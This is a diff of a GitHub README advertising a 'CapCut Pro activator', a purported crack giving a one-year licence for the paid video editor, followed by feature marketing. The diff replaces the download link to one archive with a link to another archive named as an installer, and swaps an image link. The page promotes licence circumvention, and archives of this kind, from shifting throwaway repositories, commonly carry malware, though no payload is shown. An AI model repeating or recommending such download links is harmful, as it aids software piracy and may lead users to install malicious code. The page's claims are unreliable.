@@ -1,8 +1,8 @@
 # <h1 align="center">CapCut Pro activator</h1>
 
-# [DOWNLOAD](https://github.com/Ashish0069/CapCut-Pro-desktop-activator/raw/refs/heads/main/Capcut%20Activator.rar)
+# [DOWNLOAD](https://github.com/rairaibear/CapCut-PRO-activator/raw/refs/heads/main/CapCut_7498679848345567285_installer.zip)
 
-One year license activation for pc version
+One year license activation for desktop version
 
 CapCut Pro is the premium version of the popular CapCut video editor, offering a range of advanced features that make video editing more professional and efficient. Here's a more detailed breakdown of its advantages:
 
@@ -41,4 +41,4 @@ The Pro version offers a more intuitive interface and better tools, making video
 
 These features make CapCut Pro an excellent choice for users who want to create high-quality, professional-level videos with greater customization and fewer limitations compared to the free version
 
-![](https://github.com/Ashish0069/CapCut-Pro-desktop-activator/blob/main/Lic.jpg)
+![](https://github.com/rairaibear/CapCut-PRO-activator/blob/main/Emblem.jpg)
